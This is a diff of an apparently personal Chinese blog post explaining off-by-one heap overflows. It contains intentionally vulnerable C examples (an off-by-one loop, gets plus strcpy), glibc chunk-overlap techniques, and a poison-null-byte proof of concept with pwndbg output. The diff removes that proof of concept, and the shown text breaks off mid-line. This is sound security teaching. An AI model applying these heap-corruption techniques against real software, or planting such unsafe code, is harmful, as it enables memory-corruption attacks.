@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>off-by-one | chuwei'blog</title><meta name="author" content="chuwei"><meta name="copyright" content="chuwei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="off-by-oneoff-by-one是缓冲区溢出的一种特殊形式，即只能溢出一个字 节。这种漏洞往往是在字符串操作时边界检查不严谨所导致的，例如  循环语句中的循环次数设置有误。#include #include  #include int main() &amp;#123;     char *chunk1,*chunk2;     chunk1 &#x3D; (char *)malloc(16);     c">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>off-by-one | chuwei'blog</title><meta name="author" content="chuwei"><meta name="copyright" content="chuwei"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="off-by-oneoff-by-one是缓冲区溢出的一种特殊形式，即只能溢出一个字 节。这种漏洞往往是在字符串操作时边界检查不严谨所导致的，例如  循环语句中的循环次数设置有误。1234567891011121314151617181920#include&lt;stdio.h&gt;#include &lt;malloc.h&gt;#include&lt;string.h&gt;int mai">
 <meta property="og:type" content="article">
 <meta property="og:title" content="off-by-one">
 <meta property="og:url" content="http://wysyrg.github.io/2022/08/06/off-by-one/index.html">
 <meta property="og:site_name" content="chuwei&#39;blog">
-<meta property="og:description" content="off-by-oneoff-by-one是缓冲区溢出的一种特殊形式，即只能溢出一个字 节。这种漏洞往往是在字符串操作时边界检查不严谨所导致的，例如  循环语句中的循环次数设置有误。#include #include  #include int main() &amp;#123;     char *chunk1,*chunk2;     chunk1 &#x3D; (char *)malloc(16);     c">
+<meta property="og:description" content="off-by-oneoff-by-one是缓冲区溢出的一种特殊形式，即只能溢出一个字 节。这种漏洞往往是在字符串操作时边界检查不严谨所导致的，例如  循环语句中的循环次数设置有误。1234567891011121314151617181920#include&lt;stdio.h&gt;#include &lt;malloc.h&gt;#include&lt;string.h&gt;int mai">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://wysyrg.github.io/img/973119.jpg">
 <meta property="article:published_time" content="2022-08-06T02:41:45.540Z">
@@ -16,7 +16,7 @@
   localSearch: undefined,
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -141,49 +141,11 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1597994478373.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">chuwei'blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">off-by-one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-06T02:41:45.540Z" title="发表于 2022-08-06 10:41:45">2022-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-07T15:43:27.791Z" title="更新于 2022-01-07 23:43:27">2022-01-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="off-by-one"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h2><p>off-by-one是缓冲区溢出的一种特殊形式，即只能溢出一个字 节。这种漏洞往往是在字符串操作时边界检查不严谨所导致的，例如 </p>
-<h3 id="循环语句中的循环次数设置有误。"><a href="#循环语句中的循环次数设置有误。" class="headerlink" title="循环语句中的循环次数设置有误。"></a>循环语句中的循环次数设置有误。</h3><pre class=" language-lang-c"><code class="language-lang-c">#include<stdio.h>
-#include <malloc.h>
-#include<string.h>
-int main()
-&#123;
-    char *chunk1,*chunk2;
-    chunk1 = (char *)malloc(16);
-    chunk2 = (char *)malloc(16);
-    int i;
-    for(i = 0; i <= 16; i++)
-    &#123;
-        chunk1[i] = getchar();
-    &#125;
-    for(i = 0; i <= 16; i++)
-    &#123;
-        printf("%c",chunk1[i]);
-    &#125;
-    system("pause");
-    return 0;
-&#125;
-</code></pre>
-<pre class=" language-lang-c"><code class="language-lang-c">0123456789abcdefghijk // \n
-0123456789abcdefg
-</code></pre>
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1597994478373.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">chuwei'blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">off-by-one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-06T02:41:45.540Z" title="发表于 2022-08-06 10:41:45">2022-08-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-07T15:43:27.791Z" title="更新于 2022-01-07 23:43:27">2022-01-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="off-by-one"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h2><p>off-by-one是缓冲区溢出的一种特殊形式，即只能溢出一个字 节。这种漏洞往往是在字符串操作时边界检查不严谨所导致的，例如 </p>
+<h3 id="循环语句中的循环次数设置有误。"><a href="#循环语句中的循环次数设置有误。" class="headerlink" title="循环语句中的循环次数设置有误。"></a>循环语句中的循环次数设置有误。</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        chunk1[i] = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,chunk1[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0123456789</span>abcdefghijk <span class="comment">// \n</span></span><br><span class="line"><span class="number">0123456789</span>abcdefg</span><br></pre></td></tr></table></figure>
 <p>上面这个例子首先创建了两个char类型的指针，分别指向malloc(16)出来的chunk1和chunk2。接着调用my_gets函 数传入了chunk1的指针和16byte大小的空间，进入for循环调用getchar函数进行输入。 值得注意的是：for循环这个语句：for(i = 0; i &lt;= 16; i++)，由于i是从0开始的，并且i&lt;=16，也就是说循环实际上 是执行了17次的，这就导致了chunk1会溢出一个字节。</p>
-<h3 id="字符串边界设置不合理"><a href="#字符串边界设置不合理" class="headerlink" title="字符串边界设置不合理"></a>字符串边界设置不合理</h3><pre class=" language-lang-c"><code class="language-lang-c">#include<stdio.h>
-#include<malloc.h>
-#include<string.h>
-int main(void)
-&#123;
-    char buffer[40]="";
-    void *chunk1;
-    chunk1=malloc(24);
-    puts("Get Input");
-    gets(buffer);
-    if(strlen(buffer)==24)
-    &#123;
-        strcpy(chunk1,buffer);
-    &#125;
-    return 0;
-&#125;
-</code></pre>
+<h3 id="字符串边界设置不合理"><a href="#字符串边界设置不合理" class="headerlink" title="字符串边界设置不合理"></a>字符串边界设置不合理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>来看一下这个程序的流程：首先创建了40字节的字符串buffer，然后void出一个chunk指针指向malloc(24)，利用 gets函数对buffer进行输入，如果是输入的为24字节就使用strcpy复制到堆中。 请注意：有一个隐形的东西值得我们注意—字符串结束符\x00。调用gets函数后，\x00会自动的添加在输入的字符串 中，当strcpy进行拷贝时，会将\x00存入到堆块中，进一步说chunk1中写入了25个字节。这就导致了chunk1溢出了 一个字节</p>
 <p>发生在堆上的off-by-one，根据其是否涉及堆块头的修改可分为 两类，第一类是普通的off-by-one，通常用于修改堆上的指针；第二 类则是通过溢出修改堆块头，制造堆块重叠，达到泄露或改写其他数 据的目的，通常情况下溢出后所修改的是下一个堆块的size域。由于 glibc采用了空间复用技术，即将下一个堆块的prev_size域提供给当 前 chunk 使 用 ， 所 以 堆 块 实 际 可 用 的 大 小不是固定的，如果堆块是通过mmap 分配的，其实际可用大小是size减去两倍的字节大小，否则是size减去一倍的字节大小。第二类off-by-one根据溢出对象和溢出目的的不同，又可以分为四种攻击方法。</p>
 <p>（1）扩展被释放块：当溢出堆块的下一个堆块（即被溢出块） 为被释放块且处于unsorted bin中时，可以通过溢出一个字节来扩大 其size域，下次分配取出此块时，其后的堆块将被覆盖，造成堆块重 叠。该方法的成功依赖于malloc()不会对free chunk的完整性以及 next chunk的prev_size域进行检查。</p>
@@ -195,207 +157,13 @@ int main(void)
 <p>（4）house of einherjar：该方法同样针对溢出字节只能是0的 情况。当溢出堆块的下一个堆块处于使用中时，通过溢出修改其 PREV_INUSE位，同时将prev_size域修改为该堆块与目标堆块位置 的偏移。在该堆块被释放时，将与上一个被释放块合并，造成堆块重 叠，</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201072332971.png" alt="image-20220107213933305"></p>
 <h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><p>根据前面对收缩被释放块的描述，我们再给出一段示例代码。首先按顺序分配三个堆块chunk a、chunk b和chunk c，并且释放 chunk b；此时假设chunk a中存在null byte溢出漏洞，则利用该漏 洞可以缩小chunk b的size域；然后连续分配两个堆块chunk b1和 chunk b2，其中b1必须是非fastbin大小的chunk，b1和b2都位于 原chunk b的内部；接下来依次释放chunk b1和chunk c，此时b1 和c越过b2被合并为一个free chunk；再次分配就将产生堆块重叠</p>
-<pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
-#include <malloc.h>
-#include <assert.h>
-
-
-int main()
-&#123;
-    setbuf(stdin, NULL);
-    setbuf(stdout, NULL);
-
-    printf("Welcome to poison null byte 2.0!\n");
-    printf("Tested in Ubuntu 16.04 64bit.\n");
-    printf("This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
-    printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
-
-    uint8_t* a;
-    uint8_t* b;
-    uint8_t* c;
-    uint8_t* b1;
-    uint8_t* b2;
-    uint8_t* d;
-    void *barrier;
-
-    printf("We allocate 0x100 bytes for 'a'.\n");
-    a = (uint8_t*) malloc(0x100);
-    printf("a: %p\n", a);
-    int real_a_size = malloc_usable_size(a);
-    printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
-        "(it may be more than 0x100 because of rounding): %#x\n", real_a_size);
-
-    /* chunk size attribute cannot have a least significant byte with a value of 0x00.
-     * the least significant byte of this will be 0x10, because the size of the chunk includes
-     * the amount requested plus some amount required for the metadata. */
-    b = (uint8_t*) malloc(0x200);
-
-    printf("b: %p\n", b);
-
-    c = (uint8_t*) malloc(0x100);
-    printf("c: %p\n", c);
-
-    barrier =  malloc(0x100);
-    printf("We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
-        "The barrier is not strictly necessary, but makes things less confusing\n", barrier);
-
-    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
-
-    // added fix for size==prev_size(next_chunk) check in newer versions of glibc
-    // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
-    // this added check requires we are allowed to have null pointers in b (not just a c string)
-    //*(size_t*)(b+0x1f0) = 0x200;
-    printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
-        "the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
-    // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
-    // which is the value of b.size after its first byte has been overwritten with a NULL byte
-    *(size_t*)(b+0x1f0) = 0x200;
-
-    // this technique works by overwriting the size metadata of a free chunk
-    free(b);
-
-    printf("b.size: %#lx\n", *b_size_ptr);
-    printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
-    printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
-    a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
-    printf("b.size: %#lx\n", *b_size_ptr);
-
-    uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
-    printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
-
-    // This malloc will result in a call to unlink on the chunk where b was.
-    // The added check (commit id: 17f487b), if not properly handled as we did before,
-    // will detect the heap corruption now.
-    // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
-    // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
-    // next_chunk(P) == b-0x10+0x200 == b+0x1f0
-    // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
-    printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
-        *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
-    b1 = malloc(0x100);
-
-    printf("b1: %p\n",b1);
-    printf("Now we malloc 'b1'. It will be placed where 'b' was. "
-        "At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
-    printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
-        "before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
-    printf("We malloc 'b2', our 'victim' chunk.\n");
-    // Typically b2 (the victim) will be a structure with valuable pointers that we want to control
-
-    b2 = malloc(0x80);
-    printf("b2: %p\n",b2);
-
-    memset(b2,'B',0x80);
-    printf("Current b2 content:\n%s\n",b2);
-
-    printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
-
-    free(b1);
-    free(c);
-
-    printf("Finally, we allocate 'd', overlapping 'b2'.\n");
-    d = malloc(0x300);
-    printf("d: %p\n",d);
-
-    printf("Now 'd' and 'b2' overlap.\n");
-    memset(d,'D',0x300);
-
-    printf("New b2 content:\n%s\n",b2);
-
-    printf("Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
-        "for the clear explanation of this technique.\n");
-
-    assert(strstr(b2, "DDDDDDDDDDDD"));
-&#125;
-</code></pre>
-<pre class=" language-lang-c"><code class="language-lang-c">欢迎poison null byte 2.0!
-在Ubuntu 16.04 64位下测试。
-此技术仅适用于禁用tcache的glibc，请参阅build_glibc.sh获取构建指令。
-当存在 off by null 的时候可以使用该技术
-我们为'a'分配0x100个字节。
-a: 0x681010
-因为我们想要溢出'a'，我们需要知道'a'的'实际'大小(由于四舍五入的关系，它可能大于0x100): 0x108
-b: 0x681120
-c: 0x681330
-我们在0x681440处分配了一个障碍chunk，这样当c被释放时就不会与顶部块合并。
-这个障碍并不是必须的，但是它让事情变得不那么混乱
-在glibc的新版本中，我们需要在b中包含更新后的大小，以便通过检查'chunksize(P) != prev_size (next_chunk(P))'
-b.size: 0x211
-b.size为(0x200 + 0x10) | prev_in_use
-我们用一个空字节将'a'溢出到'b'的元数据中
-b.size: 0x200 
-c.prev_size是 0x210
-但他根据 chunk b 的 size 找的时候会找到 b+0x1f0那里,我们将通过检查，因为chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
-b1: 0x681120
-现在我们malloc b1。它会被放在b所在的地方。此时c.prev_size应该已经更新，但它依然为:0x210
-有趣的是，c.prev_size的更新值在c.prev_size之前已经写入了0x10字节：f0
-我们malloc 'b2'，我们的'受害者'块。
-b2: 0x681230
-当前b2内容:
-BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
-现在我们释放'b1'和'c':这将巩固'b1'和'c'块(忘记'b2')。
-最后，我们分配'd'，重叠'b2'。
-d: 0x681120
-现在d和b2重叠了。
-新b2内容:
-DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
-感谢 https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor 对该技术的清晰解释。
-</code></pre>
-<h3 id="首先分配a-b-c-d四个chunk"><a href="#首先分配a-b-c-d四个chunk" class="headerlink" title="首先分配a,b,c,d四个chunk"></a>首先分配a,b,c,d四个chunk</h3><pre class=" language-lang-c"><code class="language-lang-c">pwndbg> heap
-0x603000 PREV_INUSE &#123;         //a 0x111
-  prev_size = 0, 
-  size = 273, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-&#125;
-0x603110 PREV_INUSE &#123;           //b 0x211
-  prev_size = 0, 
-  size = 529, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-&#125;
-0x603320 PREV_INUSE &#123;          //c 0x111
-  prev_size = 0, 
-  size = 273, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-&#125;
-0x603430 PREV_INUSE &#123;        //barrier  0x111 防止与 top chunk 合并的 chunk
-  prev_size = 0, 
-  size = 273, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-&#125;
-0x603540 PREV_INUSE &#123;
-  prev_size = 0, 
-  size = 133825, 
-  fd = 0x0, 
-  bk = 0x0, 
-  fd_nextsize = 0x0, 
-  bk_nextsize = 0x0
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 